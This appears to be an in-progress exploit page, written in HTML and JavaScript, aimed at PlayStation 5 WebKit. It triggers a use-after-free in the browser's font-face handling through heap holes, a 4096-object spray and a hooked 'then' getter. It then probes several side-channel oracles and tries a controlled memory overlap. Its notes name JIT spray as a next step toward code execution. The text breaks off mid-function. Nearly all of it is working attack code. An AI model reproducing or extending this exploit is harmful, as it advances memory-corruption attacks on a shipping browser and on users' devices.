<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<title>PS5 v10 - Oracle</title>
<style id="s">
@font-face{font-family:prepad;src:url(np.woff);unicode-range:U+E123}
@font-face{font-family:x;src:url(nx.woff);unicode-range:U+0042}
*{margin:0;padding:0;box-sizing:border-box}
html,body{width:100%;height:100%;background:#080808;color:#bbb;
font-family:'Courier New',monospace;overflow:hidden}

#top{position:fixed;top:0;left:0;right:0;height:48px;
background:linear-gradient(180deg,#0d0d0d,#080808);
border-bottom:1px solid #1a3a2a;display:flex;align-items:center;
padding:0 14px;gap:14px;z-index:10;font-size:13px}
#top .t{color:#00ffa0;font-weight:bold}
#top .v{color:#0d0}
#top .s{color:#333}

#bar{position:fixed;top:48px;left:0;right:0;height:4px;
background:#111;z-index:10}
#bar div{height:100%;background:#00ffa0;transition:width .3s;border-radius:2px}

#out{position:fixed;top:52px;left:0;right:0;bottom:0;
padding:10px 14px;overflow-y:auto;font-size:14px;line-height:1.5;
background:#080808;-webkit-user-select:text}
#out::-webkit-scrollbar{width:5px}
#out::-webkit-scrollbar-track{background:#111}
#out::-webkit-scrollbar-thumb{background:#2a4a3a;border-radius:3px}

.o{color:#0f0}.f{color:#f55}.w{color:#fc0}.h{color:#0ff;font-weight:bold}
.s{color:#f0f;font-weight:bold}.d{color:#555}.g{color:#00ffa0;font-weight:bold}

#c{position:absolute;left:-9999px;top:-9999px}
</style>
</head>
<body>
<div id="top">
<span class="t">v10</span><span class="s">│</span>
<span class="v" id="hF">FW:?</span><span class="s">│</span>
<span class="v" id="hU">UAF:?</span><span class="s">│</span>
<span class="v" id="hC">CHK:?</span><span class="s">│</span>
<span class="v" id="hP">PRIM:?</span>
</div>
<div id="bar"><div id="bp" style="width:0%"></div></div>
<div id="out"></div>
<canvas id="c" width="512" height="128"></canvas>
<script>
"use strict";

// ============================================================
//  PS5 WebKit v10
//  
//  FINDINGS: check() returns true for ALL families
//  BUT adding a new face makes check() return false for it
//  This gives us a BINARY ORACLE!
//  
//  Also: "triger"/"trigge" inherit confusion = hash bucket
//  And: trigger renders 132px vs Helvetica 0px = different src
//
//  STRATEGY:
//  1. Map the check() oracle behavior precisely
//  2. Use "add→false" as stable oracle
//  3. Probe freed CSSFontFace via "x" family
//  4. Try to overlap freed slot with controlled object
//  5. Read through rendering oracle (132px vs 0px)
// ============================================================

const O=document.getElementById("out");
const bp=document.getElementById("bp");
function bar(p){bp.style.width=p+"%"}
function hud(id,v){const e=document.getElementById(id);if(e)e.textContent=v}

function P(m,c){const s=document.createElement("span");if(c)s.className=c;
s.textContent=m+"\n";O.appendChild(s);O.scrollTop=O.scrollHeight;
try{console.log("[v10] "+m)}catch(e){}}

function Ok(m){P("✅ "+m,"o")}function Fl(m){P("✘ "+m,"f")}
function Wr(m){P("⚠ "+m,"w")}function Hi(m){P("► "+m,"h")}
function St(m){P("★ "+m+" ★","s")}function Dm(m){P(m,"d")}
function Hd(m){P(m,"g")}function Sep(){P("─".repeat(48),"d")}

window.onerror=function(m,s,l){Fl("ERR: "+m+" @"+l)};

// ============================================================
//  State
// ============================================================
let keepAlive=[],holeFaces=[],reclaimFaces=[];
let uafTriggered=false,resolvedFaces=null,triggerFace=null;

// ============================================================
//  Font Buffer
// ============================================================
const FB="d09GMgABAAAAAAJkAA4AAAAABiAAAAIQAAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP0ZGVE0cGhwGYACCQggEEQgKcH0LCgABNgIkAxAEIAWEEAcyGy4FAI7Ctnlz5COJZMsihmWKh4f78Z573/0ZGIXRWLVZpRVNBz5LGmglcIJtH2hFs/L71vRPNg6FnRed2yOwAbJMJfRVCkhVAas6QCnP5701PYAm8AF8l8DegK66cR6mEGHAUS8K8ALFQCjz1m9GpK46tojEaUMI+PLzugVw1L1+g6Pdp10QoNuwKBKBQJW4q4V8mJ9xBx80vlmJDlJLBwDtADhxIz/D0Ya1YYmV/6ZePgIBgAmEBg1GEFgjBEZETYBSgpurYWj/ch78CyBaCUAkEgAQmj1O5W3E/1CCAu1o0I1+AIV5ERBV1dXSU+diLZ3nRV9OPep/9GPyZ/Ej398zrQyAl2Rh7bat/DBuWlu+rt026YeBG7HEWiTBtcafwuPKhODd1XFhmFr73R4rx+1LpKGZyEdolyDIR7hSoJlAAIAqpoBC8R6B0i5BIgS2SAC9niEApAChzzQCqc0uAo0ZFwhQ+vxCgBb9MYlAq744BSGqAxgjjBFIvVbQOKeKMuYfLSaEK7Yai2XguKmauX0HCg5t2NC0aubAChy/qmzUaj+jIBwDp8wtufXYHvxEVgIHtm05wG+yZ2mOGSQNC3Asy+sbTAq/FwbN6yCuJCftLedsSI0DzknNJsNUfOUqnng/9Fzes281/5JpNDqJaw3DWypomi41n5fDXAgJ/L/HCghqKARzIbLt1taqkzUt";
const FB_BYTES=(()=>{const s=atob(FB),b=new Uint8Array(s.length);
for(let i=0;i<s.length;i++)b[i]=s.charCodeAt(i);return b})();
function mkBuf(){const c=new Uint8Array(FB_BYTES.length);c.set(FB_BYTES);return c.buffer}

// ============================================================
//  Helpers
// ============================================================
function fs(){void document.body.offsetTop;void document.documentElement.offsetHeight}
function addPads(n){const sh=document.getElementById("s").sheet;
for(let i=0;i<n;i++)sh.insertRule(
`@font-face{font-family:pad${i};src:url(np${i}.woff);unicode-range:U+E000}`,
sh.cssRules.length);fs()}
function addFlush(n){const st=document.createElement("style");st.id="flush";
document.head.appendChild(st);const sh=st.sheet;
for(let i=0;i<n;i++)sh.insertRule(
`@font-face{font-family:flush${i};src:url(nf${i}.woff);unicode-range:U+E000}`,
sh.cssRules.length);fs()}
function delFlush(){const e=document.getElementById("flush");
if(e&&e.sheet){while(e.sheet.cssRules.length)e.sheet.deleteRule(0);fs()}}
function killCk(){const f=new FontFace("ck"+keepAlive.length,"local(Helvetica)",
{unicodeRange:"U+E124"});document.fonts.add(f);keepAlive.push(f)}
function chk(sp,ch){try{return document.fonts.check(sp,ch)}catch(e){return null}}

// ============================================================
//  PHASE 1: Standard UAF
// ============================================================
function makeHoles(){
Hd("Creating holes...");
for(let i=0;i<4096;i++){const f=new FontFace("hole_"+i,mkBuf(),{
unicodeRange:"U+E1"+(i%16).toString(16),
style:i%2===0?"normal":"italic",
weight:String(100+(i%9)*100),
display:["auto","block","swap","fallback","optional"][i%5]});
document.fonts.add(f);holeFaces.push(f)}
fs();for(let i=1;i<holeFaces.length;i+=2)document.fonts.delete(holeFaces[i]);
fs();for(let i=0;i<4;i++){const t=[];for(let j=0;j<512;j++)t.push(new ArrayBuffer(4096))}
Ok("Holes ready")}

function spray(){Dm("Spraying 4096 RC...");
for(let i=0;i<4096;i++){const f=new FontFace("RC_"+i,mkBuf(),{
unicodeRange:"U+0041",style:"italic",weight:"900",display:"block"});
document.fonts.add(f);reclaimFaces.push(f)}fs();Ok("Spray done")}

// ============================================================
//  PHASE 2: Oracle Calibration
//  check() returns true for everything EXCEPT
//  families that have a properly registered face
//  This gives us: exists(family) = !check("64px "+family, "A")
// ============================================================
function calibrateOracle(){
Sep();Hd("ORACLE CALIBRATION");Sep();

// Test 1: Non-existent families
P("");Dm("Test: Non-existent families");
const ne=["zzz_nothing","aaa_fake","xxx_nope","qwert","asdfgh","zz"];
for(const fam of ne){
const r=chk("64px "+fam,"A");
P("  chk(64px "+fam+") = "+r, r===true?"h":"d");
}

// Test 2: Add face then check
P("");Dm("Test: Add face → check changes");
for(const fam of["oracle_a","oracle_b"]){
const before=chk("64px "+fam,"A");
const f=new FontFace(fam,"local(Helvetica)",{unicodeRange:"U+0041"});
document.fonts.add(f);fs();
const after=chk("64px "+fam,"A");
P("  "+fam+": before="+before+" after="+after+(before!==after?" ← CHANGED":""),before!==after?"h":"d");
document.fonts.delete(f);fs();
}

// Test 3: Oracle stability over time
P("");Dm("Test: Oracle stability (20 checks)");
const results=[];
for(let i=0;i<20;i++)results.push(chk("900 italic 64px trigger","A"));
const allSame=results.every(r=>r===results[0]);
P("  Results: "+results.join(","));
P("  Stable: "+allSame,allSame?"o":"f");

// Test 4: Oracle sensitivity to spec changes
P("");Dm("Test: Spec sensitivity");
const specs=[
["64px trigger","A"],
["64px trigger","B"],
["100 64px trigger","A"],
["200 64px trigger","A"],
["300 64px trigger","A"],
["400 64px trigger","A"],
["500 64px trigger","A"],
["600 64px trigger","A"],
["700 64px trigger","A"],
["800 64px trigger","A"],
["900 64px trigger","A"],
["italic 64px trigger","A"],
["normal 64px trigger","A"],
["oblique 64px trigger","A"]
];
for(const[sp,ch]of specs){
const r=chk(sp,ch);
P("  "+sp.padEnd(28)+" '"+ch+"' = "+r);
}

// KEY TEST: Does check() discriminate between
// existing and non-existing families?
P("");Hd("KEY TEST: Oracle discrimination");
let trueCount=0,falseCount=0;
for(let i=0;i<100;i++){
const fam="probe_"+i;
const r=chk("64px "+fam,"A");
if(r===true)trueCount++;else if(r===false)falseCount++;
}
P("  100 probes: true="+trueCount+" false="+falseCount);

if(trueCount===100){
Wr("check() ALWAYS returns true - no discrimination");
P("  Need alternative oracle","d");
return"broken";
}

if(falseCount>0){
Hi("check() CAN return false!");
P("  We have a working binary oracle!","o");
return"working";
}

return"unknown";
}

// ============================================================
//  PHASE 3: Probe "x" family
//  The freed CSSFontFace was for family "x"
//  The selector might still have a corrupted entry for "x"
// ============================================================
function probeXFamily(){
Sep();Hd("PROBE 'x' FAMILY (FREED FACE)");Sep();

const xChecks=[
["64px x","A"],
["64px x","B"],
["900 italic 64px x","A"],
["normal 64px x","A"],
["64px x","C"]
];

P("");Dm("Checking 'x' family:");
for(const[sp,ch]of xChecks){
const r=chk(sp,ch);
P("  chk("+sp+", '"+ch+"') = "+r, r?"h":"d");
}

// Try adding a new face for "x"
P("");Dm("Adding new face for 'x'...");
try{
const xf=new FontFace("x","local(Helvetica)",{
unicodeRange:"U+0042",weight:"normal",style:"normal"});
document.fonts.add(xf);fs();

const after=chk("64px x","B");
P("  After add: chk(64px x, B) = "+after);

// Check if this affected trigger
const trigChk=chk("900 italic 64px trigger","A");
P("  Trigger still confused: "+trigChk);

document.fonts.delete(xf);fs();
}catch(e){Fl("  "+e.message)}

// Try adding "x" with italic 900 (matching RC properties)
P("");Dm("Adding 'x' with 900 italic...");
try{
const xf2=new FontFace("x",mkBuf(),{
unicodeRange:"U+0042",weight:"900",style:"italic"});
document.fonts.add(xf2);fs();

const after=chk("900 italic 64px x","B");
P("  After add: chk(900i x, B) = "+after);

// Check trigger
const trigChk=chk("900 italic 64px trigger","A");
P("  Trigger still confused: "+trigChk);

// Check if x and trigger share same C++ object
const xWidth=measureWidth("64px x","B");
const trigWidth=measureWidth("64px trigger","A");
P("  x width: "+xWidth+" trigger width: "+trigWidth);
if(Math.abs(xWidth-trigWidth)<0.01)Hi("SAME WIDTH → might share C++ object!");

document.fonts.delete(xf2);fs();
}catch(e){Fl("  "+e.message)}
}

function measureWidth(spec,text){
try{const ctx=document.getElementById("c").getContext("2d");
ctx.font=spec;return ctx.measureText(text).width}catch(e){return-1}
}

// ============================================================
//  PHASE 4: Rendering Oracle
//  trigger renders 132 white pixels, Helvetica renders 0
//  This is a STRONG side channel we can use
// ============================================================
function renderingOracle(){
Sep();Hd("RENDERING ORACLE");Sep();

const ctx=document.getElementById("c").getContext("2d");

function countWhitePixels(fontSpec,text){
ctx.clearRect(0,0,512,128);
ctx.fillStyle="#000";ctx.fillRect(0,0,512,128);
ctx.fillStyle="#fff";ctx.font=fontSpec;
ctx.fillText(text,10,80);
const d=ctx.getImageData(0,0,512,128).data;
let w=0;for(let i=0;i<d.length;i+=4)if(d[i]>128)w++;
return w;
}

// Baseline measurements
P("");Dm("White pixel counts:");
const tests=[
["64px trigger","AB"],
["900 italic 64px trigger","A"],
["64px Helvetica","AB"],
["64px Arial","AB"],
["64px Courier","AB"],
["64px serif","AB"],
["64px monospace","AB"],
["64px RC_0","A"],
["64px RC_103","A"],
["64px x","B"]
];

let baseline={};
for(const[sp,text]of tests){
const w=countWhitePixels(sp,text);
baseline[sp]=w;
P("  "+sp.padEnd(32)+" → "+w+" px", w>0?"h":"d");
}

// Check: Does trigger rendering change when we modify RC faces?
P("");Dm("Modifying RC_0 and checking trigger...");
const triggerPx=baseline["64px trigger"];

if(reclaimFaces.length>0){
// Remove RC_0
try{
document.fonts.delete(reclaimFaces[0]);fs();
const afterRm=countWhitePixels("64px trigger","AB");
P("  After remove RC_0: "+afterRm+" px (was "+triggerPx+")",
  afterRm!==triggerPx?"h":"d");
document.fonts.add(reclaimFaces[0]);fs();
}catch(e){}

// Remove ALL RC faces
P("");Dm("Removing ALL RC faces...");
const saved=[...reclaimFaces];
for(const f of saved)try{document.fonts.delete(f)}catch(e){}
fs();
const afterAllRm=countWhitePixels("64px trigger","AB");
P("  After remove all RC: "+afterAllRm+" px", afterAllRm!==triggerPx?"h":"d");

// Restore
for(const f of saved)try{document.fonts.add(f)}catch(e){}
fs();
const afterRestore=countWhitePixels("64px trigger","AB");
P("  After restore: "+afterRestore+" px", afterRestore!==triggerPx?"h":"d");
}

// Test: Change font size and measure pixels proportionally
P("");Dm("Pixel scaling test:");
for(const sz of [16,32,64,96]){
const px=countWhitePixels(sz+"px trigger","AB");
P("  "+sz+"px → "+px+" px");
}

return baseline;
}

// ============================================================
//  PHASE 5: getComputedStyle Oracle
//  This reads from the actual CSS cascade, which goes
//  through the selector. Might reveal C++ state.
// ============================================================
function computedStyleOracle(){
Sep();Hd("COMPUTED STYLE ORACLE");Sep();

function getComputed(family,weight,style){
const d=document.createElement("div");
d.style.cssText=`font-family:${family};font-weight:${weight};font-style:${style};position:absolute;left:-9999px;`;
document.body.appendChild(d);
const cs=getComputedStyle(d);
const result={
fontFamily:cs.fontFamily,
fontWeight:cs.fontWeight,
fontStyle:cs.fontStyle,
fontStretch:cs.fontStretch,
fontSize:cs.fontSize,
fontVariant:cs.fontVariant,
font:new Date().toISOString()
};
try{result.font=cs.font}catch(e){}
document.body.removeChild(d);
return result;
}

P("");Dm("Computed style for 'trigger':");
const trigNormal=getComputed("trigger","normal","normal");
P("  normal: weight="+trigNormal.fontWeight+" style="+trigNormal.fontStyle);
Dm("  family: "+trigNormal.fontFamily);

const trig900i=getComputed("trigger","900","italic");
P("  900i:   weight="+trig900i.fontWeight+" style="+trig900i.fontStyle);

P("");Dm("Computed style for 'Helvetica':");
const helNorm=getComputed("Helvetica","normal","normal");
P("  normal: weight="+helNorm.fontWeight+" style="+helNorm.fontStyle);
Dm("  family: "+helNorm.fontFamily);

P("");Dm("Computed style for 'x':");
const xNorm=getComputed("x","normal","normal");
P("  normal: weight="+xNorm.fontWeight+" style="+xNorm.fontStyle);
Dm("  family: "+xNorm.fontFamily);

const x900i=getComputed("x","900","italic");
P("  900i:   weight="+x900i.fontWeight+" style="+x900i.fontStyle);

// Check if trigger's computed style matches 900 italic
if(trigNormal.fontWeight==="900"||trigNormal.fontStyle==="italic"){
Hi("Normal trigger computed as 900 italic!");
Hi("The selector is feeding 900i to the CSS cascade!");
}
}

// ============================================================
//  PHASE 6: Font Loading API Oracle
//  document.fonts.load() returns which faces matched
// ============================================================
function loadAPIOracle(){
Sep();Hd("FONT LOAD API ORACLE");Sep();

const tests=[
{spec:"64px trigger",text:"A"},
{spec:"900 italic 64px trigger",text:"A"},
{spec:"64px x",text:"B"},
{spec:"900 italic 64px x",text:"B"},
{spec:"64px Helvetica",text:"A"},
{spec:"64px zzz_nonexistent",text:"A"}
];

let completed=0;
const total=tests.length;

for(const t of tests){
document.fonts.load(t.spec,t.text).then(faces=>{
P("  load("+t.spec+",'"+t.text+"') → "+faces.length+" faces");
for(const f of faces){
P("    "+f.family+" "+f.style+" "+f.weight+" "+f.status);
}
completed++;
if(completed===total)P("  All load tests complete","d");
}).catch(err=>{
P("  load("+t.spec+") REJECTED: "+err,"f");
completed++;
});
}
}

// ============================================================
//  PHASE 7: Controlled Overlap Attempt
//  Try to create a C++ object that overlaps with the
//  freed CSSFontFace, then detect it through the oracle
// ============================================================
function controlledOverlap(){
Sep();Hd("CONTROLLED OVERLAP ATTEMPT");Sep();

// Strategy: Create many objects of similar size to CSSFontFace
// on the IsoHeap, hoping one lands in the freed slot.
// Then detect which one through the oracle.

// CSSFontFace is typically 128-256 bytes on WebKit
// We'll try FontFace objects with controlled family names
// that we can detect through check()

P("");Dm("Step 1: Remove all RC faces to clear the slot");
const saved=[...reclaimFaces];
for(const f of saved)try{document.fonts.delete(f)}catch(e){}
fs();

// Force GC
for(let i=0;i<8;i++){const t=[];for(let j=0;j<256;j++)t.push(new ArrayBuffer(8192))}

P("");Dm("Step 2: Spray controlled probe faces");
const PROBE_COUNT=2048;
const probes=[];
for(let i=0;i<PROBE_COUNT;i++){
// Each probe has a unique family we can detect
const f=new FontFace("probe_"+i.toString(16).padStart(4,"0"),
"local(Helvetica)",{
unicodeRange:"U+0041",
style:i%2===0?"normal":"italic",
weight:String(100+(i%9)*100)
});
document.fonts.add(f);
probes.push(f);
}
fs();

P("");Dm("Step 3: Check which probes are 'confused'");
let confusedProbes=[];
for(let i=0;i<PROBE_COUNT;i++){
const fam="probe_"+i.toString(16).padStart(4,"0");
// If this probe overlaps the freed slot, check() might
// return an unexpected value for it
const r900i=chk("900 italic 64px "+fam,"A");
const rNorm=chk("normal 64px "+fam,"A");

// In corrupted state, check() returns true for everything
// But if a probe properly registered, it might return false
// for non-matching specs
if(r900i===false||rNorm===false){
confusedProbes.push({index:i,family:fam,r900i:r900i,rNorm:rNorm});
Hi("  probe_"+i+": 900i="+r900i+" norm="+rNorm+" ← DIFFERENT!");
}
}

if(confusedProbes.length===0){
P("  No probes showed different behavior","d");
}

// Restore
P("");Dm("Step 4: Restore RC faces");
for(const f of saved)try{document.fonts.add(f)}catch(e){}
for(const f of probes)try{document.fonts.delete(f)}catch(e){}
fs();

return confusedProbes;
}

// ============================================================
//  PHASE 8: Final Assessment & Next Steps
// ============================================================
function finalAssessment(oracleState,renderBaseline,confusedProbes){
Sep();Hd("FINAL ASSESSMENT");Sep();P("");

const conf=chk("900 italic 64px trigger","A");
P("UAF:              "+(uafTriggered?"✅":"✘"),uafTriggered?"o":"f");
P("check() confusion: "+(conf?"✅":"✘"),conf?"o":"f");
P("Oracle state:     "+oracleState,oracleState==="working"?"o":"w");
P("Confused probes:  "+confusedProbes.length,confusedProbes.length>0?"o":"d");
P("");

if(oracleState==="broken"){
P("check() returns true for ALL families","w");
P("This means the CSSFontSelector is fully corrupted","d");
P("The 'add→false' behavior is our only discriminator","d");
P("");
P("Alternative oracles:","g");
P("  1. Rendering pixels (132 vs 0 white px)","d");
P("  2. getComputedStyle() weight/style","d");
P("  3. document.fonts.load() resolved faces","d");
P("  4. Adding face → check changes","d");
}

P("");
St("WHAT WE KNOW");
P("  • CSSFontSelector hash table is corrupted","d");
P("  • All check() calls return true (default fallthrough)","d");
P("  • Adding a face creates a proper entry (check→false)","d");
P("  • trigger renders 132 white px vs Helvetica 0","d");
P("  • 'triger'/'trigge' also confused = hash bucket","d");
P("  • Stack addresses stripped by PS5 WebKit","d");
P("");
St("NEXT STEPS");
P("  1. Use 'add→false' oracle to map hash table","d");
P("  2. Find which hash bucket is corrupted","d");
P("  3. Spray objects into that specific bucket","d");
P("  4. Read through rendering pixel oracle","d");
P("  5. OR: Try JIT spray for code exec","d");
}

// ============================================================
//  Main
// ============================================================
window.onload=()=>{
const ua=navigator.userAgent||"";
const m=ua.match(/PlayStation\s*5\/?\s*([0-9]+(?:\.[0-9]+)?)/i);
const fw=m?m[1]:"?";
hud("hF","FW:"+fw);

bar(5);makeHoles();

bar(15);Hd("Trigger setup");
triggerFace=new FontFace("trigger","local(Helvetica)",{unicodeRange:"U+0041"});
document.fonts.add(triggerFace);void triggerFace.loaded;
addPads(48);addFlush(768);Ok("Trigger ready");

bar(25);Hd("Waiting for UAF...");

let fired=false;
Object.defineProperty(FontFace.prototype,"then",{configurable:true,
get(){if(!fired&&this===triggerFace){
fired=true;uafTriggered=true;hud("hU","UAF:✅");
St("UAF WINDOW OPEN");
killCk();document.getElementById("s").sheet.deleteRule(1);fs();
delFlush();for(let i=0;i<holeFaces.length;i+=4)try{document.fonts.delete(holeFaces[i])}catch(e){}
fs();for(let i=0;i<8;i++){const t=[];for(let j=0;j<256;j++)t.push(new ArrayBuffer(8192))}
